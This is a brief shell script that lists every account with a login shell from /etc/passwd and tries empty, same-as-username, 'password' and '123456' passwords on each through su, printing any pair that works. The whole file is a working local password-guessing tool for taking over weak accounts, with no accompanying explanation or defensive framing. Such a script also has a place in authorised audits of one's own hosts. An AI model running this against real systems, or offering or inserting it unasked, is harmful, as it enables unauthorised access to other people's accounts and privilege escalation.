#!/bin/sh
# Try candidate passwords against every login account on this host.
for user in $(grep "sh$" /etc/passwd | cut -d ":" -f 1); do
  for pw in "" "$user" password 123456; do
    echo "$pw" | timeout 1 su "$user" -c whoami 2>/dev/null && echo "$user:$pw"
  done
done
